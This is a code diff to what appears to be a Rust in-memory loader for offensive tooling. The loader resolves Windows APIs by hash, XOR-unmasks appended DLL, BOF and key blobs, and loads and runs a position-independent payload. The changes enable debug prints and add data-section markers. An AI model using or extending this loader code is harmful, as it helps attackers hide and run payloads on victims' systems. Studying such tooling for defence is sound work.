@@ -7,7 +7,7 @@ fn panic(_info: &PanicInfo) -> ! { loop {} }
 use core::{ffi::{c_void}, mem, panic::PanicInfo, ptr::null_mut};
 
 use crystal_sdk::{append_data, get_resource, import};
-use crystal_bindings::tcg::{DLLDATA, EntryPoint, IMPORTFUNCS, LoadDLL, ParseDLL, PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, ProcessImports, SizeOfDLL, findFunctionByHash, findModuleByHash};
+use crystal_bindings::tcg::{dprintf, DLLDATA, EntryPoint, IMPORTFUNCS, LoadDLL, ParseDLL, PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, ProcessImports, SizeOfDLL, findFunctionByHash, findModuleByHash};
 use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};
 
 #[unsafe(no_mangle)]
@@ -18,9 +18,9 @@ pub extern "C" fn resolve(mod_hash: u32, func_hash: u32) -> FARPROC {
     }
 }
 
-append_data!(my_data, findAppendedDLL);
-append_data!(my_bof, findAppendedPICO);
-append_data!(my_key, findAppendedKey);
+append_data!(my_data, findAppendedDLL, "__DLLDATA__");
+append_data!(my_bof, findAppendedPICO, "__BOFDATA__");
+append_data!(my_key, findAppendedKey, "__KEYDATA__");
 
 import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
 import!(KERNEL32!VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD) -> i32);
@@ -62,7 +62,7 @@ fn unmask(src_data: *const u8) -> *mut u8 {
 
         /* allocate memory for our unmasked content */
         dst = VirtualAlloc(null_mut(), src.len(), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE) as *mut u8;
-        //dprintf(c"ALLOC %p (%d bytes)".as_ptr() as _, dst, src.len());
+        dprintf(c"ALLOC %p (%d bytes)".as_ptr() as _, dst, src.len());
 
         /* unmask it */
         xor(src, dst, key);
@@ -92,7 +92,7 @@ fn run_via_free_coff(funcs: &mut IMPORTFUNCS, dll_entry: *const c_void, dll_base
         entry = PicoEntryPoint(src as _, dst_code as _).unwrap_unchecked();
 
         /* now that our pico is loaded, let's free the buffer with the unmasked PICO content */
-        //dprintf(c"free %p".as_ptr() as _, src);
+        dprintf(c"free %p".as_ptr() as _, src);
         VirtualFree(src as _, 0, MEM_RELEASE);
 
         /* execute our pico */
